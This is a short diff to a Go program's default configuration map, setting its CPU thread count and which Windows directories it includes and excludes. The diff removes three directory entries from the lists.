@@ -21,15 +21,12 @@ var DefaultConfig = map[string]interface{}{
 	"cpuThreads": int(math.Ceil(float64(runtime.NumCPU()) / float64(4))),
 	"mainDirs": []string{
 		"C:/Users/<USERNAME>/",
-		"E:/$MyData",
-		"E:/mssecuredisk.setup",
 	},
 	"excludeSubMainDirs": []string{
 		"C:/Users/<USERNAME>/AppData/Roaming",
 	},
 	"secondaryDirs": []string{
 		"C:/",
-		"D:/",
 	},
 	"excludeDirs": []string{
 		"C:/Windows/",
